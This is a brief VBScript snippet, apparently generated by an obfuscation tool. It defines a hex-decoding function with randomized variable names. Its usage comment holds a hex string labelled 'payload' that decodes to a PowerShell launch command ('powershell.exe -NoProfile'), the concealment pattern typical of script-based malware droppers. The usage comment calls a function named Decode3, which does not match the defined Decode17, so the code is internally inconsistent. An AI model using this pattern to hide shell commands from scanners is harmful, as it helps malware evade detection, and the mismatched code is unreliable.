Function Decode17(h14_CWIiAum)
    Dim r15_SJfqFjdC, i16_MLwvBzYNOx, p17_DPDzOsy
    r15_SJfqFjdC = ""
    For i16_MLwvBzYNOx = 1 To Len(h14_CWIiAum) Step 2
        p17_DPDzOsy = Mid(h14_CWIiAum, i16_MLwvBzYNOx, 2)
        Select Case p17_DPDzOsy
            Case "20": r15_SJfqFjdC = r15_SJfqFjdC & " "
            Case "2D": r15_SJfqFjdC = r15_SJfqFjdC & "-"
            Case "2E": r15_SJfqFjdC = r15_SJfqFjdC & "."
            Case "65": r15_SJfqFjdC = r15_SJfqFjdC & "e"
            Case "78": r15_SJfqFjdC = r15_SJfqFjdC & "x"
            Case Else: r15_SJfqFjdC = r15_SJfqFjdC & Chr(CLng("&H" & p17_DPDzOsy))
        End Select
    Next
    Decode17 = r15_SJfqFjdC
End Function

'' Complete script usage:
'' Dim hexPayload
'' hexPayload = "706f7765727368656c6c2e657865202d4e6f50726f66696c65"
'' Dim result
'' result = Decode3(hexPayload)
'' WScript.Echo result
